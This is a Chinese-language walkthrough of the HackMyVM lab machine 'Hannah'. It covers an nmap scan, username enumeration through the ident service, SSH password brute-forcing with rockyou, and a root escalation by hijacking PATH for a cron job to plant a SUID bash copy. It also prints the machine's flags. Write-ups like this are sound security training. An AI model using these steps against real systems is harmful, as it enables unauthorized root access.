# Hannah

2025.02.20 https://hackmyvm.eu/machines/machine.php?vm=Hannah

[video](https://www.bilibili.com/video/BV1xRAEefEmn/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

# Scan

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey:
|   3072 5f1c78369905320982d3d5054c1475d1 (RSA)
|   256 0669ef979b34d7f3c79660d1a1ffd82c (ECDSA)
|_  256 853dda74b2684ea6f7e5f58540902e9a (ED25519)
80/tcp  open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/enlightenment
|_auth-owners: moksha
|_http-server-header: nginx/1.18.0
113/tcp open  ident?
|_auth-owners: root
```

80 web robots.txt 显示 /enlightenment 访问后是 404，扫描后也没其他路径。

看看 ident 的功能定义：

```
此包是一个简单的 PERL 脚本，用于查询 ident 服务 (113/TCP)，以确定监听目标系统每个 TCP 端口的进程的所有者。这有助于在渗透测试期间确定目标服务的优先级（您可能希望首先攻击以 root 身份运行的服务）。或者，收集的用户名列表可用于对其他网络服务进行密码猜测攻击。
```

再看 ident 113 端口枚举出来的服务运行用户信息，moksha 和 root，现在有一个用户名，尝试 rockyou 爆破，得到登陆密码: hannah ， ssh 登陆该用户。

得到 user flag：

```
moksha@hannah:~$ cat user.txt
HMVGGHFWP2023
```

/etc/crontab 发现 :

```
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

* * * * * root touch /tmp/enlIghtenment
```

发现 touch 的路径为 /usr/bin/touch ，PATH 中/media 路径在/usr/bin 之前，发现/media 目录权限是 777，可以执行路径劫持：

```
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /media/touch
chmod +x /media/touch
```

等待 1 分钟，出现 suid 程序 rootbash，得到 root flag：

```
moksha@hannah:/var/www/html$ /tmp/rootbash -p
rootbash-5.1# cd /root
rootbash-5.1# ls
root.txt
rootbash-5.1# cat root.txt
HMVHAPPYNY2023
```
